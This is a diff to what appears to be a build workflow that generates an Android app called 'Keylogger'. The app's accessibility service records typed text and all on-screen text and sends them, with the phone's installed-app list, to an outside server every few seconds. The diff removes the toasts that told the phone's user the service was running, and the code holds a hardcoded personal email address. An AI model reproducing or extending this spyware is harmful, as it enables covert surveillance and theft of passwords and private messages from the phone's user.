@@ -27,38 +27,15 @@ jobs:
 
           cat > build.gradle << 'EOF'
           buildscript {
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-              dependencies {
-                  classpath 'com.android.tools.build:gradle:8.2.0'
-              }
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.2.0' }
           }
-
-          allprojects {
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-          }
+          allprojects { repositories { google(); mavenCentral() } }
           EOF
 
           cat > settings.gradle << 'EOF'
-          pluginManagement {
-              repositories {
-                  google()
-                  mavenCentral()
-                  gradlePluginPortal()
-              }
-          }
-          dependencyResolutionManagement {
-              repositoriesMode.set(RepositoriesMode.PREFER_PROJECT)
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-          }
+          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
+          dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.PREFER_PROJECT); repositories { google(); mavenCentral() } }
           rootProject.name = "Keylogger"
           include ':app'
           EOF
@@ -70,14 +47,10 @@ jobs:
           EOF
 
           cat > app/build.gradle << 'EOF'
-          plugins {
-              id 'com.android.application'
-          }
-
+          plugins { id 'com.android.application' }
           android {
               namespace 'com.example.keylogger'
               compileSdk 34
-
               defaultConfig {
                   applicationId "com.example.keylogger"
                   minSdk 21
@@ -85,20 +58,14 @@ jobs:
                   versionCode 1
                   versionName "1.0"
               }
-
               buildTypes {
-                  release {
-                      minifyEnabled false
-                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-                  }
+                  release { minifyEnabled false; proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro' }
               }
-
               compileOptions {
                   sourceCompatibility JavaVersion.VERSION_1_8
                   targetCompatibility JavaVersion.VERSION_1_8
               }
           }
-
           dependencies {
               implementation 'androidx.appcompat:appcompat:1.6.1'
               implementation 'com.squareup.okhttp3:okhttp:4.12.0'
@@ -112,78 +79,56 @@ jobs:
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               package="com.example.keylogger">
-
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
-
               <application
                   android:allowBackup="true"
                   android:icon="@android:drawable/sym_def_app_icon"
                   android:label="@string/app_name"
                   android:theme="@style/Theme.Keylogger">
-
-                  <activity
-                      android:name=".MainActivity"
-                      android:exported="true">
+                  <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-
-                  <service
-                      android:name=".MonitorService"
+                  <service android:name=".MonitorService"
                       android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                       android:exported="false">
                       <intent-filter>
                           <action android:name="android.accessibilityservice.AccessibilityService" />
                       </intent-filter>
-                      <meta-data
-                          android:name="android.accessibilityservice"
+                      <meta-data android:name="android.accessibilityservice"
                           android:resource="@xml/accessibility_config" />
                   </service>
-
               </application>
           </manifest>
           EOF
 
           cat > app/src/main/java/com/example/keylogger/MainActivity.java << 'EOF'
           package com.example.keylogger;
-
           import android.os.Bundle;
           import android.webkit.WebSettings;
           import android.webkit.WebView;
           import android.webkit.WebViewClient;
           import androidx.appcompat.app.AppCompatActivity;
-
           public class MainActivity extends AppCompatActivity {
-
               private WebView webView;
-
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
                   setContentView(R.layout.activity_main);
-
                   webView = findViewById(R.id.webView);
-
-                  WebSettings webSettings = webView.getSettings();
-                  webSettings.setJavaScriptEnabled(true);
-                  webSettings.setDomStorageEnabled(true);
-                  webSettings.setLoadWithOverviewMode(true);
-                  webSettings.setUseWideViewPort(true);
-
+                  WebSettings ws = webView.getSettings();
+                  ws.setJavaScriptEnabled(true);
+                  ws.setDomStorageEnabled(true);
                   webView.setWebViewClient(new WebViewClient());
                   webView.loadUrl("https://mobilecontrol-web.onrender.com/");
               }
-
               @Override
               public void onBackPressed() {
-                  if (webView.canGoBack()) {
-                      webView.goBack();
-                  } else {
-                      super.onBackPressed();
-                  }
+                  if (webView.canGoBack()) webView.goBack();
+                  else super.onBackPressed();
               }
           }
           EOF
@@ -192,7 +137,6 @@ jobs:
           package com.example.keylogger;
 
           import android.accessibilityservice.AccessibilityService;
-          import android.content.SharedPreferences;
           import android.content.pm.ApplicationInfo;
           import android.content.pm.PackageManager;
           import android.os.BatteryManager;
@@ -201,7 +145,6 @@ jobs:
           import android.os.Looper;
           import android.view.accessibility.AccessibilityEvent;
           import android.view.accessibility.AccessibilityNodeInfo;
-          import android.widget.Toast;
           import org.json.JSONArray;
           import org.json.JSONObject;
           import java.io.File;
@@ -221,9 +164,7 @@ jobs:
               private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
               private static final String OWNER_EMAIL = "mdfatema03@gmail.com";
               private static final String DEVICE_ID = "child-phone-123";
-              private static final String DEVICE_NAME = Build.MANUFACTURER + " " + Build.MODEL;
-              private static final String PREFS_NAME = "device_prefs";
-              private static final String TOKEN_KEY = "device_token";
+              private static final String DEVICE_TOKEN = "static-token-123"; // <-- fixed token
 
               private OkHttpClient httpClient = new OkHttpClient.Builder()
                       .connectTimeout(10, TimeUnit.SECONDS)
@@ -233,49 +174,11 @@ jobs:
               private Handler mainHandler = new Handler(Looper.getMainLooper());
               private Thread uiSenderThread;
               private Thread deviceStateThread;
-              private String deviceToken = "";
 
               @Override
               public void onServiceConnected() {
                   super.onServiceConnected();
-                  showToast("Service started");
-                  autoRegister();
-              }
-
-              private void autoRegister() {
-                  new Thread(() -> {
-                      try {
-                          JSONObject payload = new JSONObject();
-                          payload.put("ownerEmail", OWNER_EMAIL);
-                          payload.put("deviceId", DEVICE_ID);
-                          payload.put("deviceName", DEVICE_NAME);
-
-                          RequestBody body = RequestBody.create(
-                                  MediaType.parse("application/json; charset=utf-8"),
-                                  payload.toString()
-                          );
-                          Request request = new Request.Builder()
-                                  .url(API_BASE + "/api/devices/register-auto")
-                                  .post(body)
-                                  .build();
-                          Response response = httpClient.newCall(request).execute();
-                          if (response.isSuccessful()) {
-                              String jsonStr = response.body().string();
-                              JSONObject json = new JSONObject(jsonStr);
-                              deviceToken = json.getString("deviceToken");
-                              saveToken(deviceToken);
-                              showToast("Device registered");
-                              mainHandler.post(this::startThreads);
-                          } else {
-                              showToast("Register failed: " + response.code());
-                              mainHandler.postDelayed(this::autoRegister, 10000);
-                          }
-                      } catch (Exception e) {
-                          e.printStackTrace();
-                          showToast("Register error: " + e.getMessage());
-                          mainHandler.postDelayed(this::autoRegister, 10000);
-                      }
-                  }).start();
+                  startThreads();
               }
 
               private void startThreads() {
@@ -286,14 +189,9 @@ jobs:
               private void startUiSender() {
                   uiSenderThread = new Thread(() -> {
                       while (!Thread.currentThread().isInterrupted()) {
-                          try {
-                              sendUiData();
-                              Thread.sleep(2000);
-                          } catch (InterruptedException e) {
-                              Thread.currentThread().interrupt();
-                          } catch (Exception e) {
-                              e.printStackTrace();
-                          }
+                          try { sendUiData(); Thread.sleep(2000); }
+                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+                          catch (Exception e) { e.printStackTrace(); }
                       }
                   });
                   uiSenderThread.setDaemon(true);
@@ -303,28 +201,13 @@ jobs:
               private void startDeviceStateSender() {
                   deviceStateThread = new Thread(() -> {
                       while (!Thread.currentThread().isInterrupted()) {
-                          try {
-                              sendDeviceState();
-                              Thread.sleep(30000);
-                          } catch (InterruptedException e) {
-                              Thread.currentThread().interrupt();
-                          } catch (Exception e) {
-                              e.printStackTrace();
-                          }
+                          try { sendDeviceState(); Thread.sleep(30000); }
+                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+                          catch (Exception e) { e.printStackTrace(); }
                       }
                   });
                   deviceStateThread.setDaemon(true);
                   deviceStateThread.start();
-              }
-
-              private String getStoredToken() {
-                  SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-                  return prefs.getString(TOKEN_KEY, "");
-              }
-
-              private void saveToken(String token) {
-                  SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-                  prefs.edit().putString(TOKEN_KEY, token).apply();
               }
 
               private void sendDeviceState() {
@@ -332,7 +215,6 @@ jobs:
                       String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
                       int battery = getBatteryLevel();
                       List<InstalledApp> apps = getInstalledApps();
-
                       JSONArray appsArray = new JSONArray();
                       for (InstalledApp app : apps) {
                           JSONObject obj = new JSONObject();
@@ -340,33 +222,24 @@ jobs:
                           obj.put("package", app.packageName);
                           appsArray.put(obj);
                       }
-
                       JSONObject payload = new JSONObject();
+                      payload.put("ownerEmail", OWNER_EMAIL);
                       payload.put("deviceId", DEVICE_ID);
-                      payload.put("deviceToken", deviceToken);
+                      payload.put("deviceToken", DEVICE_TOKEN);
                       payload.put("deviceName", deviceName);
                       payload.put("battery", battery);
                       payload.put("installedApps", appsArray);
 
                       RequestBody body = RequestBody.create(
-                              MediaType.parse("application/json; charset=utf-8"),
-                              payload.toString()
-                      );
-                      Request request = new Request.Builder()
-                              .url(API_BASE + "/api/device-state")
-                              .post(body)
-                              .build();
+                              MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                      Request request = new Request.Builder().url(API_BASE + "/api/device-state").post(body).build();
                       httpClient.newCall(request).execute().close();
-                  } catch (Exception e) {
-                      e.printStackTrace();
-                  }
+                  } catch (Exception e) { e.printStackTrace(); }
               }
 
               private int getBatteryLevel() {
                   BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
-                  if (bm != null) {
-                      return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
-                  }
+                  if (bm != null) return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                   return 0;
               }
 
@@ -374,11 +247,9 @@ jobs:
                   List<InstalledApp> list = new ArrayList<>();
                   PackageManager pm = getPackageManager();
                   List<ApplicationInfo> apps = pm.getInstalledApplications(0);
-                  for (ApplicationInfo appInfo : apps) {
-                      if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                          String name = pm.getApplicationLabel(appInfo).toString();
-                          String packageName = appInfo.packageName;
-                          list.add(new InstalledApp(name, packageName));
+                  for (ApplicationInfo ai : apps) {
+                      if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                          list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName));
                       }
                   }
                   return list;
@@ -389,22 +260,14 @@ jobs:
                       try {
                           JSONObject payload = new JSONObject();
                           payload.put("deviceId", DEVICE_ID);
-                          payload.put("deviceToken", deviceToken);
+                          payload.put("deviceToken", DEVICE_TOKEN);
                           payload.put("text", text);
                           payload.put("timestamp", System.currentTimeMillis());
-
                           RequestBody body = RequestBody.create(
-                                  MediaType.parse("application/json; charset=utf-8"),
-                                  payload.toString()
-                          );
-                          Request request = new Request.Builder()
-                                  .url(API_BASE + "/api/keylog")
-                                  .post(body)
-                                  .build();
+                                  MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                          Request request = new Request.Builder().url(API_BASE + "/api/keylog").post(body).build();
                           httpClient.newCall(request).execute().close();
-                      } catch (Exception e) {
-                          e.printStackTrace();
-                      }
+                      } catch (Exception e) { e.printStackTrace(); }
                   }).start();
               }
 
@@ -412,39 +275,25 @@ jobs:
                   try {
                       AccessibilityNodeInfo root = getRootInActiveWindow();
                       if (root == null) return;
-
                       String uiText = extractTextFromNode(root);
-
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", DEVICE_ID);
-                      payload.put("deviceToken", deviceToken);
+                      payload.put("deviceToken", DEVICE_TOKEN);
                       payload.put("uiText", uiText);
                       payload.put("timestamp", System.currentTimeMillis());
-
                       RequestBody body = RequestBody.create(
-                              MediaType.parse("application/json; charset=utf-8"),
-                              payload.toString()
-                      );
-                      Request request = new Request.Builder()
-                              .url(API_BASE + "/api/ui")
-                              .post(body)
-                              .build();
+                              MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                      Request request = new Request.Builder().url(API_BASE + "/api/ui").post(body).build();
                       httpClient.newCall(request).execute().close();
-                  } catch (Exception e) {
-                      e.printStackTrace();
-                  }
+                  } catch (Exception e) { e.printStackTrace(); }
               }
 
               @Override
               public void onAccessibilityEvent(AccessibilityEvent event) {
                   if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                       if (event.getText() != null && event.getText().size() > 0) {
-                          CharSequence typedText = event.getText().get(0);
-                          if (typedText != null && typedText.length() > 0) {
-                              String text = typedText.toString();
-                              logToFile(text);
-                              sendKeylog(text);
-                          }
+                          String text = event.getText().get(0).toString();
+                          if (!text.isEmpty()) { logToFile(text); sendKeylog(text); }
                       }
                   }
               }
@@ -452,18 +301,11 @@ jobs:
               private String extractTextFromNode(AccessibilityNodeInfo node) {
                   if (node == null) return "";
                   StringBuilder sb = new StringBuilder();
-                  if (node.getText() != null) {
-                      sb.append(node.getText().toString()).append(" | ");
-                  }
-                  if (node.getContentDescription() != null) {
-                      sb.append(node.getContentDescription().toString()).append(" | ");
-                  }
+                  if (node.getText() != null) sb.append(node.getText().toString()).append(" | ");
+                  if (node.getContentDescription() != null) sb.append(node.getContentDescription().toString()).append(" | ");
                   for (int i = 0; i < node.getChildCount(); i++) {
                       AccessibilityNodeInfo child = node.getChild(i);
-                      if (child != null) {
-                          sb.append(extractTextFromNode(child));
-                          child.recycle();
-                      }
+                      if (child != null) { sb.append(extractTextFromNode(child)); child.recycle(); }
                   }
                   return sb.toString();
               }
@@ -472,39 +314,22 @@ jobs:
                   File dir = new File(getExternalFilesDir(null), "logs");
                   if (!dir.exists()) dir.mkdirs();
                   File file = new File(dir, "keylog.txt");
-                  try (FileWriter fw = new FileWriter(file, true)) {
-                      fw.append(data).append("\n");
-                  } catch (IOException e) {
-                      e.printStackTrace();
-                  }
+                  try (FileWriter fw = new FileWriter(file, true)) { fw.append(data).append("\n"); }
+                  catch (IOException e) { e.printStackTrace(); }
               }
 
-              private void showToast(String message) {
-                  mainHandler.post(() -> Toast.makeText(this, message, Toast.LENGTH_SHORT).show());
-              }
-
-              @Override
-              public void onInterrupt() {
-              }
+              @Override public void onInterrupt() {}
 
               @Override
               public void onDestroy() {
                   super.onDestroy();
-                  if (uiSenderThread != null && uiSenderThread.isAlive()) {
-                      uiSenderThread.interrupt();
-                  }
-                  if (deviceStateThread != null && deviceStateThread.isAlive()) {
-                      deviceStateThread.interrupt();
-                  }
+                  if (uiSenderThread != null && uiSenderThread.isAlive()) uiSenderThread.interrupt();
+                  if (deviceStateThread != null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
               }
 
               private static class InstalledApp {
-                  String name;
-                  String packageName;
-                  InstalledApp(String name, String packageName) {
-                      this.name = name;
-                      this.packageName = packageName;
-                  }
+                  String name; String packageName;
+                  InstalledApp(String name, String packageName) { this.name = name; this.packageName = packageName; }
               }
           }
           EOF
@@ -515,9 +340,7 @@ jobs:
               android:layout_width="match_parent"
               android:layout_height="match_parent"
               android:orientation="vertical">
-
-              <WebView
-                  android:id="@+id/webView"
+              <WebView android:id="@+id/webView"
                   android:layout_width="match_parent"
                   android:layout_height="match_parent" />
           </LinearLayout>
